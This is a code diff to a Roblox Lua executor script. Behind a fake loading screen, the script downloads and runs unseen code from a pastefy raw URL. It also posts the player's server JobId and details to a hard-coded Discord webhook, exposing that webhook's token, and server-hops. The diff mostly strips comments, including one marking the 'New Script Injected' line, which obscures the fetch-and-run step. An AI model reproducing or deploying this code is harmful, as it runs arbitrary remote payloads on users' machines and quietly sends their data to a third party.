@@ -1,17 +1,15 @@
 local desiredVersion = "1689"
 local PlaceId = game.PlaceId
-local AUTO_HOP_LOOP = false       -- Disabled as requested
-local AUTO_TELEPORT_LOOP = false  -- Disabled as requested
+local AUTO_HOP_LOOP = false
+local AUTO_TELEPORT_LOOP = false
 local HOP_INTERVAL = 1
 local TELEPORT_INTERVAL = 1
 
--- SERVICES
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 
--- Clipboard compatibility
 local setclipboard = setclipboard or toclipboard or (Clipboard and Clipboard.set)
 
 repeat task.wait(0.1) until game:IsLoaded()
@@ -116,14 +114,12 @@ end
 
 local gui, statusLabel, versionLabel = createLoadingUI()
 
--- Copy Job ID
 local function copyJobId()
     if setclipboard then
         setclipboard(game.JobId)
     end
 end
 
--- Webhook
 local function sendWebhook()
     local webhookUrl = "https://discord.com/api/webhooks/1403212302605357088/iqWgOYegTK5wOyc_yspDLA2HglemNCckSpLcsun76id0AtotHuotJBET4wHwl1R_vb-M"
     local players = #Players:GetPlayers()
@@ -170,7 +166,6 @@ local function sendWebhook()
     end)
 end
 
--- Server hop
 local function tryServerHop()
     local servers = {}
     local cursor = nil
@@ -207,26 +202,22 @@ local function tryServerHop()
     end
 end
 
--- MAIN EXECUTION
 task.spawn(function()
     statusLabel.Text = "✅ Script executing..."
 
-    -- ✅ New Script Injected
     loadstring(game:HttpGet("https://pastefy.app/kS20FuCv/raw"))()
 
-    -- ❌ Immediately disable all auto loops
     AUTO_HOP_LOOP = false
     AUTO_TELEPORT_LOOP = false
 
     copyJobId()
     sendWebhook()
 
-    -- Auto hop if server is full (5/5 players)
     local currentPlayers = #Players:GetPlayers()
     local maxPlayers = Players.MaxPlayers or 5
 
     if currentPlayers >= maxPlayers then
-        statusLabel.Text = "⚠️ Server is full (" .. currentPlayers .. "/" .. maxPlayers .. "). Auto hopping..."
+        statusLabel.Text = "⚠️ Server is full. Auto hopping..."
         task.wait(2)
         tryServerHop()
         return
